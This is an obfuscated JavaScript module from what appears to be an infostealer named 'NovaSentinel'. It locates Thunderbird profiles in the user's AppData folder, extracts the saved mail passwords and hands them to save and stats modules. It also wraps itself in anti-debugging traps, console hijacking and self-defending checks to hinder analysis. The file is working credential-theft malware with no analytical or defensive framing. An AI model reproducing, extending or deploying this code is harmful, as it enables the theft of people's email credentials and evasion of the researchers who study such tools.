const _0x583029 = (function () {
    let _0x3e8bfb = true
    return function (_0x48fac4, _0x5bbde1) {
      const _0x92371d = _0x3e8bfb
        ? function () {
            if (_0x5bbde1) {
              const _0x86172f = _0x5bbde1.apply(_0x48fac4, arguments)
              return (_0x5bbde1 = null), _0x86172f
            }
          }
        : function () {}
      return (_0x3e8bfb = false), _0x92371d
    }
  })(),
  _0x2bdd56 = _0x583029(this, function () {
    return _0x2bdd56
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x2bdd56)
      .search('(((.+)+)+)+$')
  })
_0x2bdd56()
const _0x33b713 = (function () {
  let _0x27339e = true
  return function (_0x21a928, _0x42cb09) {
    const _0x3d7a56 = _0x27339e
      ? function () {
          if (_0x42cb09) {
            const _0xdb3981 = _0x42cb09.apply(_0x21a928, arguments)
            return (_0x42cb09 = null), _0xdb3981
          }
        }
      : function () {}
    return (_0x27339e = false), _0x3d7a56
  }
})()
;(function () {
  _0x33b713(this, function () {
    const _0x49b3c1 = new RegExp('function *\\( *\\)')
    const _0x4cd73a = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x5b6d91 = _0x4a1a7b('init')
    !_0x49b3c1.test(_0x5b6d91 + 'chain') || !_0x4cd73a.test(_0x5b6d91 + 'input')
      ? _0x5b6d91('0')
      : _0x4a1a7b()
  })()
})()
const _0x13a8d7 = (function () {
    let _0x3b7839 = true
    return function (_0x33a819, _0x7bc38e) {
      const _0x13de21 = _0x3b7839
        ? function () {
            if (_0x7bc38e) {
              const _0x1039cb = _0x7bc38e.apply(_0x33a819, arguments)
              return (_0x7bc38e = null), _0x1039cb
            }
          }
        : function () {}
      return (_0x3b7839 = false), _0x13de21
    }
  })(),
  _0x4bc11f = _0x13a8d7(this, function () {
    let _0x59b46e
    try {
      const _0x5f451e = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x59b46e = _0x5f451e()
    } catch (_0x4ea64f) {
      _0x59b46e = window
    }
    const _0x4709de = (_0x59b46e.console = _0x59b46e.console || {})
    const _0x2bd9f6 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x3daa6d = 0; _0x3daa6d < _0x2bd9f6.length; _0x3daa6d++) {
      const _0x516b74 = _0x13a8d7.constructor.prototype.bind(_0x13a8d7),
        _0x1bfcbc = _0x2bd9f6[_0x3daa6d],
        _0x2097a6 = _0x4709de[_0x1bfcbc] || _0x516b74
      _0x516b74['__proto__'] = _0x13a8d7.bind(_0x13a8d7)
      _0x516b74.toString = _0x2097a6.toString.bind(_0x2097a6)
      _0x4709de[_0x1bfcbc] = _0x516b74
    }
  })
_0x4bc11f()
const _0x58a195 = require('path')
const _0x452bd4 = require('./browsers'),
  _0x10a0ec = require('./save')
const { stat: _0x26b42d } = require('./stats')
async function _0x335935() {
  var _0x34108a = []
  try {
    const _0x5e90b7 = _0x452bd4.getGeckoProfiles(
      _0x58a195.join(process.env.appdata, 'Thunderbird', 'Profiles\\'),
      'Thunderbird'
    )
    for (let _0x1e9cf0 = 0; _0x1e9cf0 < _0x5e90b7.length; _0x1e9cf0++) {
      const _0x5c8c61 = _0x5e90b7[_0x1e9cf0]
      let _0x2be504 = await _0x452bd4.getGeckoPasswords(_0x5c8c61.path, '')
      _0x34108a = _0x34108a.concat(_0x2be504)
    }
  } catch (_0x3e90bf) {}
  if (_0x34108a.length > 0) {
    _0x10a0ec.saveMailClients(_0x34108a, 'Thunderbird')
    _0x26b42d.AddMessenger('Thunderbird')
  }
}
module.exports = { NovaSentinelThunderbird: _0x335935 }
function _0x4a1a7b(_0x11ca10) {
  function _0xf7e1df(_0x1ab148) {
    if (typeof _0x1ab148 === 'string') {
      return function (_0x3c3893) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x1ab148 / _0x1ab148).length !== 1 || _0x1ab148 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0xf7e1df(++_0x1ab148)
  }
  try {
    if (_0x11ca10) {
      return _0xf7e1df
    } else {
      _0xf7e1df(0)
    }
  } catch (_0x6e2f49) {}
}
